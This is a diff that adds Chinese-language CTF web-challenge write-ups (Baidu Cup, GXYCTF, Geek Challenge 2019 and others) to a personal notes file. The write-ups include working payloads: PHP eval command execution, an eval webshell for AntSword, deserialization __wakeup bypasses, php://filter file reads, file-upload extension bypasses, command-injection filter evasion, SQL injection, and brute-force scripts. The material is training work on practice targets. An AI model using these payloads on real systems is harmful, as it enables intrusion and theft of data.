@@ -933,7 +933,7 @@ location /online-movies {
 
 成功显示了flag值。通过本题学习了中间件的目录访问
 
-### “百度杯”2017年春秋欢乐赛——象棋（未写WP）
+### “百度杯”2017年春秋欢乐赛——象棋
 
 ![image-20210505134028040](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210505134028040.png)
 
@@ -987,13 +987,169 @@ def bp():
 
 ### 第一届“百度杯”信息安全攻防总决赛 线上选拔赛——Upload
 
+![image-20210514163331855](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163331855.png)
+
+查看注释发现了用post方法ichunqiu=你的发现?。。。。抓包看看有什么发现嘛
+
+![image-20210514163514415](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163514415.png)
+
+果然在response包中有发现，base64解码看看是什么值，然后用post方法传递一下
+
+![image-20210514163627700](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163627700.png)![image-20210514163652540](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163652540.png)
+
+![image-20210514163725829](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163725829.png)
+
+用post方法传递参数出来个fast！什么意思？？？
+
+看看别人的WP吧。看到返回的是fast!!!，看来我的手速是满足不了ichunqiu了，那就上py跑
+
+python脚本：
+
+~~~python
+def main():
+    a = requests.session()
+    b = a.get("http://6ebbbd692cc047ce8ccd326a88f72eb32090a688e6cc4bfa.changame.ichunqiu.com/")
+    key1 = b.headers["flag"]
+    c = base64.b64decode(key1)
+    d = str(c).split(":")
+    key = base64.b64decode(d[1])
+    body = {"ichunqiu": key}
+    f = a.post("http://6ebbbd692cc047ce8ccd326a88f72eb32090a688e6cc4bfa.changame.ichunqiu.com/", data=body)
+    print(f.text)
+~~~
+
+得到了一个路径名：
+
+![image-20210514165337201](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165337201.png)
 
 
 
+进入了一个新页面
+
+![image-20210514165419360](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165419360.png)
+
+点击按钮，进入了一个登陆页面
+
+![image-20210514165538338](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165538338.png)
+
+爆破Captcha的python脚本
+
+~~~python
+def getFlag():
+    key = 'cbadd1'
+    # dict='abcdefghijklmnopqrstuvwxyz0123456789'
+    for i in range(100000000000):
+        a = hashlib.md5(str(i).encode()).hexdigest()[:6]
+        if(a==key):
+            print(i)
+    pass
+
+~~~
+
+用SQL注入登录报错,抓包也没有发现特别的东西，那现在用户名和密码在那里获得呢？？？
+
+![image-20210514165913008](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165913008.png)
+
+看了别人的wp,发现上面那个目录存在.svn泄露，于是用dirsearch工具跑了一下，扫描出来了.svn/wc.db文件，打开看见了用户名。。。这题真的好细节。。。。。
+
+![image-20210514171046029](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171046029.png)
+
+算出username：8638d5263ab0d3face193725c23ce095，密码随便填一个就行，再输上验证码
+
+![image-20210514171343917](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171343917.png)
+
+又弹出了一个地址文件
+
+![image-20210514171438298](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171438298.png)
+
+上传文件漏洞，开始上传
+
+试验如下上传参数，最终使用image/jpeg以及1.pht得到flag回显，应该是写死的逻辑。
+
+```
+------WebKitFormBoundarytJvTA9B9Lb4TVKYS
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: text/php
 
 
+
+------WebKitFormBoundarytJvTA9B9Lb4TVKYS
+Content-Disposition: form-data; name="file"; filename="1.jpg"
+Content-Type: image/jpeg
+
+
+
+------WebKitFormBoundarytJvTA9B9Lb4TVKYS
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: image/jpeg
+
+
+
+------WebKitFormBoundarytJvTA9B9Lb4TVKYS
+Content-Disposition: form-data; name="file"; filename="1.pht"
+Content-Type: image/jpeg
+```
+
+- [Content-Type对照表](http://tool.oschina.net/commons)
+- Apache解析php后缀：php、phtml、pht、php3、php4、php5
+
+![image-20210514171906782](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171906782.png)
 
 ### “百度杯”CTF比赛 十月场——GetFlag
+
+![image-20210514154717269](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514154717269.png)
+
+看注释抓数据包都没有发现，点击login是一个登录框，注释和数据包中都没有提示关于账号密码的有关信息，试试万能注入吧，并且还要爆破一下Captcha的值，写个py脚本吧
+
+![image-20210514154818399](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514154818399.png)
+
+python脚本
+
+~~~python
+def getFlag():
+    key = 'af1336'
+    dict='abcdefghijklmnopqrstuvwxyz0123456789'
+    for i in range(100000000000):
+        a = hashlib.md5(str(i).encode()).hexdigest()[:6]
+        if(a==key):
+            print(i)
+    pass
+~~~
+
+得到Captcha,并且成功登录
+
+![image-20210514160018761](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160018761.png)
+
+登录成功页面显示内容如下所示
+
+![image-20210514160113043](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160113043.png)
+
+a.php里的内容如下：
+
+~~~php
+<?php
+	echo "Do what you want to do, web dog, flag is in the web root dir";
+?>
+
+~~~
+
+查看注释，发现了下载链接！是不是存在任意目录下载漏洞？试试吧，a.php提示了flag在web根目录，即 ` /var/html/www/Challenges`
+
+![image-20210514160316130](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160316130.png)
+
+![image-20210514160719762](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160719762.png)
+
+
+
+flag文件存在，但是返回的内容不对。
+
+构造payload:
+
+~~~
+/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
+~~~
+
+得到如下代码，开始审计
 
 ~~~php
 <?php
@@ -1019,9 +1175,12 @@ if ($spaceone === 'flag'){
  
 ~~~
 
+通过代码审计得知给flag.php传入参数`?flag=flag;`即可获得helloctf.php的内容。 
+ 因为执行了一个eval()函数，要在代码末尾添加分号来结束一行代码，所以传入参数要带一个分号，进过eval()函数后分号被去掉。
 
+![image-20210514162837104](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514162837104.png)
 
-百度了一样PHP字符串的表示方法，之后发现字符串还有一种表示方法叫做Heredoc，不包含引号，于是构造flag参数如图，因为包含换行，所以需要url编码
+或者——》百度了一样PHP字符串的表示方法，之后发现字符串还有一种表示方法叫做Heredoc，不包含引号，于是构造flag参数如图，因为包含换行，所以需要url编码
 
 ~~~
 <<<s
@@ -1033,6 +1192,12 @@ s;
 ### “百度杯”CTF比赛 十月场——Not Found
 
 ![image-20210506202653751](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506202653751.png)
+
+看源码没有任何发现，扫描目录没有任何发现，现在就只剩下抓包了。。。。
+
+response数据包发现了异常，好像是在提示我们请求方法，下面把请求方法总结一下
+
+![image-20210514203216275](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203216275.png)
 
 > 1   GET  发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外get支持快取、缓存、可保留书签等。幂等
 >
@@ -1052,15 +1217,223 @@ s;
 >
 > 8   TRACE  回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击
 
+在请求方法是options的时候发现了response数据包异常，提示了一个地址
+
+![image-20210514203422492](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203422492.png)
+
+
+
+用options方法请求`?f=1.php`,返回了一个302重定向包，返回数据包还有信息
+
+![image-20210514203658866](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203658866.png)
+
+
+
+~~~php
+<?php 
+	$msg = "not here";
+	$msg .= PHP_EOL;
+	$msg .="plz trying";
+	echo $msg;
+~~~
+
+好的，又不知到下一步该怎么办了，看了别人的wp说目录里面有.htaceess文件，我看了自己的工具扫描的结果并没有发现啊，果然这工具真的不准确。。。。打开.htaccess看看里面有啥
+
+![image-20210514210704307](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514210704307.png)
+
+提示了一个文件，访问试试啥情况。
+
+![image-20210514210900929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514210900929.png)
+
+
+
+
+
+ip不正确,XFF不对，修改一下`X-Forwarded-For`，好像修改XFF不行，修改 `clien-ip`就可以了，成功获得flag
+
+![image-20210514211105269](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211105269.png)
+
+刷了这么多ctf的web题，发现其实并不难，就是突然卡在某一步不知所措。。。。。自己还得多加练习啊
+
 ### “百度杯”CTF比赛 十月场——fuzzing
 
 ![image-20210506204654898](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506204654898.png)
 
+源码没有发现，抓包发现了异常
+
+![image-20210514211438777](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211438777.png)
+
+
+
+`ip,Large internal network`提示ip是大网段，用10.0.0.1试试
+
+![image-20210514211617914](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211617914.png)
+
+
+
+果然有蹊跷啊，重定向./m4nage.php
+
+![image-20210514211752635](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211752635.png)
+
+./m4nage.php文件输出一句话，show me your key ? 难道是传递一个key值？但是key值没有提示啊，用key=1试试吧
+
+用GET方法没有反应，在请求包和cookie中加上key也没有反应，最后用post方法传递key值成功显示错误
+
+![image-20210514212127514](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212127514.png)
+
+看看错误信息
+
 > key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]
 
-### “百度杯”CTF比赛 十月场——Hash
+key值是ichunqiuxxx，现在就是写个py脚本爆破一下谁的md5值与给定的值相等
+
+python爆破脚本：
+
+~~~python
+def fuzz():
+    dict='abcdefghijklmnopqrstuvwxyz0123456789'
+    key1='ichunqiu'
+    for i in dict:
+        for j in dict:
+            for k in dict:
+                result = hashlib.md5((key1+i+j+k).encode()).hexdigest()
+                if(result == "1b4167610ba3f2ac426a68488dbd89be"):
+                    print(key1+i+j+k)
+~~~
+
+爆破出来结果是：`ichunqiu105`
+
+payload：
+
+~~~
+key=ichunqiu105
+~~~
+
+![image-20210514212512918](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212512918.png)
+
+成功到达下一步，又给了一个php文件，访问请求一下
+
+返回数据包
+
+![image-20210514212607499](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212607499.png)
+
+
+
+提示源代码在x0.txt文件中，又给了一段加密之后的密文。先看看x0.txt里面的源码吧
+
+~~~php
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+	$ckey_length = 4;
+
+	$key = md5($key ? $key : UC_KEY);
+	$keya = md5(substr($key, 0, 16));
+	$keyb = md5(substr($key, 16, 16));
+	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
+
+	$cryptkey = $keya . md5($keya . $keyc);
+	$key_length = strlen($cryptkey);
+
+	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
+	$string_length = strlen($string);
+
+	$result = '';
+	$box = range(0, 255);
+
+	$rndkey = array();
+	for ($i = 0; $i <= 255; $i++) {
+		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
+	}
+
+	for ($j = $i = 0; $i < 256; $i++) {
+		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
+		$tmp = $box[$i];
+		$box[$i] = $box[$j];
+		$box[$j] = $tmp;
+	}
+
+	for ($a = $j = $i = 0; $i < $string_length; $i++) {
+		$a = ($a + 1) % 256;
+		$j = ($j + $box[$a]) % 256;
+		$tmp = $box[$a];
+		$box[$a] = $box[$j];
+		$box[$j] = $tmp;
+		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+	}
+
+	if ($operation == 'DECODE') {
+		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
+			return substr($result, 26);
+		} else {
+			return '';
+		}
+	} else {
+		return $keyc . str_replace('=', '', base64_encode($result));
+	}
+
+}
+~~~
+
+应该是运行这个PHP代码，传入`string`参数和 `key`密码，string是加密之后的密文，key就是我们之前破解的ichunqiu105。运行试试吧
+
+![image-20210514213310938](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514213310938.png)
+
+成功获得flag值，欧耶
+
+### “百度杯”CTF比赛 十月场——Hash（*）
 
 ![image-20210507084430919](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507084430919.png)
+
+点击hahaha超链接
+
+![image-20210514213908130](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514213908130.png)
+
+看到这段话，我下意识想到的是数据包里面肯定有信息，我们要修改数据包中的信息，抓包看看吧
+
+![image-20210514214118268](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514214118268.png)
+
+
+
+发现了123，修改成别的数据试试
+
+![image-20210514214154958](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514214154958.png)
+
+提示hash值不对，看来key和hash值是绑定在一起的。看看他们两个有什么规律，怎么对应的
+
+原来注释中有一段代码
+
+~~~php
+<!--$hash=md5($sign.$key);the length of $sign is 8
+~~~
+
+写个py脚本把`$sign`爆破出来吧
+
+python脚本：
+
+~~~python
+def hash():
+    hash = 'f9109d5f83921a551cf859f853afe7bb'
+    key='123'
+    for sign in range(10000000,99999999):
+        h = hashlib.md5((str(sign)+key).encode()).hexdigest()
+        if(h == hash):
+            print(sign)
+~~~
+
+没有解出来，看来是前面的八位不只是只有数字，用网上的在线解密系统破解出来了
+
+`sign=kkkkkk01`
+
+好了，可以构造这一步的payload：
+
+~~~
+?key=111&hash=adaa10eef3a02754da03b5a3a6f40ae6
+~~~
+
+成功显示下一步：去访问Gu3ss_m3_h2h2.php
+
+![image-20210514215259103](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514215259103.png)
+
+获得了一段PHP代码，开始代码审计吧
 
 ~~~php
 <?php
@@ -1097,7 +1470,99 @@ if (isset($_GET['var'])) {
 ?> 
 ~~~
 
+在上面的代码中看到了反序列化，看来这一关是写出序列化之后的字符串然后传递参数
 
+序列化之后还要base64。
+
+获得序列化代码
+
+~~~php
+<?php
+class Demo {
+    private $file = 'Gu3ss_m3_h2h2.php';
+
+    public function __construct($file) {
+        $this->file = $file;
+    }
+
+    function __destruct() {
+        echo @highlight_file($this->file, true);
+    }
+
+    function __wakeup() {
+        if ($this->file != 'Gu3ss_m3_h2h2.php') {
+            //the secret is in the f15g_1s_here.php
+            $this->file = 'Gu3ss_m3_h2h2.php';
+        }
+    }
+}
+$a = new Demo($file='f15g_1s_here.php');
+echo serialize($a);
+
+?> 
+~~~
+
+
+
+原始序列化字符串：O:4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 
+
+说下这个正则 /[oc]:\d+:/i [oc] 两个字母构成的原子表加：再加只是一个数字，再加： 然后不区分大小写
+
+这个O 是序列化里面的类 C是自定义序列化方式
+
+如果这个正则的绕过是O:+4 这样就可以绕过
+
+改成：O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 
+
+由于__wakeup（）方法会改变file变量值，所以只需要把Demo后面的的1改成大于1的数就行，代表着参数数量，就会绕过 \_\_wakeup()方法
+
+改成：O:+4:"Demo":2:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 
+
+**！！！一定要注意！！！**
+
+    private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
+
+对于private变量，我们需要在类名和字段名前面都会加上\0或%00的前缀
+比如
+
+~~~
+O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+~~~
+
+**本题我用在线php代码运行序列化有特殊符号，估计就是\0的乱码，但是就是复制不出来：**
+
+![image-20210515131912146](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515131912146.png)
+
+注意%00Demo%00file，如果我们直接复制粘贴然后更改，就会出错。最好用PHP代码来改：
+
+```php
+<?php
+class Demo {
+    private $file = 'f15g_1s_here.php';
+
+
+}
+$a = new Demo();
+$s = serialize($a);
+
+$s = str_replace('O:4', 'O:+4',$s);//绕过正则
+
+$s = str_replace(':1:', ':2:' ,$s);//绕过wakeup函数
+
+echo base64_encode($s);//最后base64编码
+
+
+?>
+```
+
+这样打印出的就是正确的base64编码了。这里Get到了一个新姿势。
+所以payload:
+
+~~~
+?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==
+~~~
+
+然后就可以获得f15g_1s_here.php的源码:：
 
 ~~~php
 <?php
@@ -1111,9 +1576,26 @@ if (isset($_GET['val'])) {
 ?> 
 ~~~
 
+主要就是eval的命令执行。
+我们这样构造：
 
+    ?val=${eval($_GET[a])}&a=echo `ls`;
 
-val=${eval($_POST[0])}
+利用的原理就是像这样实现命令执行：
+
+    ${phpinfo()} 
+
+这样成功执行了ls命令，发现了flag所在的文件，然后cat就可以获得flag:
+
+~~~
+?val=${eval($_GET[a])}&a=echo `cat True_F1ag_i3_Here_233.php`;
+~~~
+
+当然，也可以用蚁剑连：
+
+~~~
+/f15g_1s_here.php?val=${eval($_POST[a])}
+~~~
 
 ### [极客大挑战 2019]Havefun 1
 
@@ -1129,13 +1611,82 @@ val=${eval($_POST[0])}
 
 ![image-20210507105339870](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507105339870.png)
 
+说明这是个数字型注入，而且还屏蔽了order by、union select关键字，用堆叠注入发现了异常，爆出了数据库信息
+
+![image-20210515135427302](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135427302.png)
+
+爆出表信息，但是使用 `desc Flag`查询表的结构信息被拦截了
+
+![image-20210515135620792](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135620792.png)
+
+![image-20210515135720807](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135720807.png)
+
+这该怎么办？？？没思路了，看看别人的wp，说是比赛时题目泄露了源码
+
+~~~sql
+select $_GET['query'] || flag from Flag
+~~~
+
+
+
+然后有两种解
+**解题思路**1：
+
+payload：`*,1`
+
+查询语句：select *,1||flag from Flag
+**解题思路**2：
+
+payload:   `1;set sql_mode=PIPES_AS_CONCAT;select 1`
+
+解析：
+
+    在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。
+    但在mysql 缺省不支持。需要调整mysql 的sql_mode
+    模式：pipes_as_concat 来实现oracle 的一些功能。
+![image-20210515140701481](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515140701481.png)
+
+
+
 ### [ACTF2020 新生赛]Include 1
 
 ![image-20210507112302338](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112302338.png)
 
+在url地址上发现了异常，猜想一下是文件包含漏洞吗？
+
+使用PHP伪协议读取flag.php源码
+
+![image-20210515141841619](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515141841619.png)
+
+~~~php
+php://filter/convert.base64-encode/resource=flag.php
+~~~
+
+成功获得源码，base64解码获得flag
+
+![image-20210515142041791](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142041791.png)
+
+
+
 ### [极客大挑战 2019]Secret File 1
 
 ![image-20210507112433680](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112433680.png)
+
+源码中发现了超链接，点进去看看有什么![image-20210515142435067](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142435067.png)
+
+还是有一个超链接SECRET，点进去并没有发现什么异常
+
+![image-20210515142519836](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142519836.png)
+
+页面提示，查阅结束，查看源码也没有什么异常。抓包看看吧
+
+![image-20210515142717264](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142717264.png)
+
+
+
+抓包发现了异常，这是一个重定向的包，注释中给了一个正确的文件地址
+
+访问看看，出现了PHP代码，开始审计吧，看来还是文件包含啊
 
 ~~~php
 <html>
@@ -1155,6 +1706,26 @@ val=${eval($_POST[0])}
 </html>
 ~~~
 
+payload：/secr3t.php?file=flag.php 获得不了flag值
+
+![image-20210515143424579](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143424579.png)
+
+直接文件包含不显示flag，看来只能获得源码信息了
+
+payload：
+
+~~~
+/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php  
+~~~
+
+![image-20210515143857310](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143857310.png)
+
+base64解码即可
+
+![image-20210515143926391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143926391.png)
+
+
+
 ### [极客大挑战 2019]LoveSQL 1
 
 简单，利用information_schema库
@@ -1167,15 +1738,52 @@ Payload:
 
 ![image-20210507194417743](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194417743.png)
 
-### GXYCTF2019]Ping Ping Ping
+### [GXYCTF2019]Ping Ping Ping
 
 ![image-20210507194557084](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194557084.png)
 
-远程命令执行&内联执行
+很明显这一关考察的内容是RCE，看看他有什么过滤限制吧
 
-内联，就是将反引号内命令的输出作为输入执行
+![image-20210515144219514](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144219514.png) 
 
-https://blog.csdn.net/vanarrow/article/details/108295481
+`ls`命令成功显示flag.php文件，估计限制了空格或者特定访问这个文件的命令
+
+输入空格报错了
+
+![image-20210515144402920](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144402920.png)
+
+**空格过滤**
+
+> 1. ${IFS}替换
+> 2. $IFS$1替换
+> 3. ${IFS替换
+> 4. %20替换
+> 5. <和<>重定向符替换
+> 6. %09替换
+
+用`$IFS$数字`代替
+
+还过滤了flag字母
+
+![image-20210515144803348](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144803348.png)
+
+可以使用变量拼接绕过
+
+payload：
+
+~~~
+?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php
+~~~
+
+成功获得flag值
+
+![image-20210515145339369](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515145339369.png)
+
+还可以使用内联绕过。内联，就是将反引号内命令的输出作为输入执行。
+
+```bash
+?ip=127.0.0.1;cat$IFS$1`ls`
+```
 
 ### [极客大挑战 2019]Knife
 
@@ -1233,13 +1841,184 @@ flag位置
 
 **利用PHP的字符串解析特性**
 
+抓包看看，输入单引号报错，看来果然设置了waf
+
+![image-20210515183117379](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515183117379.png)
+
+直接请求calc.php，回显了代码
+
+~~~php
+<?php 
+error_reporting(0); 
+if(!isset($_GET['num'])){ 
+    show_source(__FILE__); 
+}else{ 
+        $str = $_GET['num']; 
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
+        foreach ($blacklist as $blackitem) { 
+                if (preg_match('/' . $blackitem . '/m', $str)) { 
+                        die("what are you want to do?"); 
+                } 
+        } 
+        eval('echo '.$str.';'); 
+} 
+?> 
+
+~~~
+
+这是一段限制的代码，利用正则表达式
+
+特殊字符好像就直接页面错误，，这应该是waf！！！
+ 可是我们不知道waf如何写的，，该如何绕过呢？？
+ 其实利用PHP的字符串解析特性就能够进行绕过waf！！
+ 构造参数`? num=phpinfo()`（注意num前面有个空格）就能够绕过：
+
+> 为什么要在num前加一个空格？
+>
+> 答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
+>
+> 发现过滤怎么办？
+>
+> 答：用char()转ascii再进行拼接
+
+接下来就好办了，由于“/”被过滤了，，，所以我们可以使用chr(47)来进行表示，进行目录读取：
+
+![image-20210515184948909](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515184948909.png)
+
+
+
+发现了名字为 `flagg`的文件，直接执行php命令 `file_get_contents()`函数获取flagg文件里面的内容，
+
+payload:
+
+~~~
+/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+~~~
+
+得到flag
+
+![image-20210515185650968](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515185650968.png)
+
 ### [极客大挑战 2019]PHP
 
-**private** 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，**类名和字段名前面都会加上\0的前缀**。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
+**private** 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，**类名和字段名前面都会加上%00的前缀**。字符串长度也包括所加前缀的长度。其中 %00 字符也是计算长度的。
 
 **当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。**
 
+进入网站很明显，提示备份信息
+
+![image-20210515190414833](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515190414833.png)
+
+扫描目录发现了 `www.zip`文件，下载下来发现了几个文件
+
+![image-20210515190500106](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515190500106.png)
+
+flag.php中无关键信息，忽略掉，出题人也不会这么简单让你得到flag值
+
+
+
+index.php关键代码：
+
+~~~php
+ <?php
+    include 'class.php';
+    $select = $_GET['select'];
+    $res=unserialize(@$select);
+  ?>
+~~~
+
+class.php:
+
+~~~php
+<?php
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+    function __wakeup(){
+        $this->username = 'guest';//反序列化方法执行时，调用。这里修改参数的数量绕过即可
+    }
+
+    function __destruct(){
+        if ($this->password != 100) {
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
+        }
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+
+            
+        }
+    }
+}
+?>
+~~~
+
+index.php中传递 select参数，传递的是一个序列化后的字符串。
+
+估计是传递Name类的序列化字符串，其中username==='admin'&&password\==100。
+
+Name类对像序列化payload
+
+~~~
+<?php
+class Name{
+    private $username = 'admin';
+    private $password = 100;
+}
+$a = new Name();
+$s = serialize($a);
+echo $s;
+
+?>
+~~~
+
+把标记的乱码换成`%00`
+
+![image-20210515192758387](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515192758387.png)
+
+payload:
+
+~~~
+/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;} 
+~~~
+
+成功得到flag
+
+![image-20210515192847754](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515192847754.png)
+
+这个题考的就是反序列化，包括用参数绕过__destruct()方法，还有private变量序列化后的字符串的类名和属性名前面要加上 `%00`
+
 ### [极客大挑战 2019]Upload
+
+试了一大通，最终用文件名后缀 `.phtml`和图片编码头 `GIF89a?`和修改 `Content-Type: image/jpeg`，用的是长标签的PHP代码成功上传，然后用蚁剑连接即可
+
+![image-20210515194547376](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515194547376.png)
+
+
+
+成功在根目录下找到flag文件
+
+![image-20210515194633306](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515194633306.png)
 
 ### [极客大挑战 2019]BabySQL
 
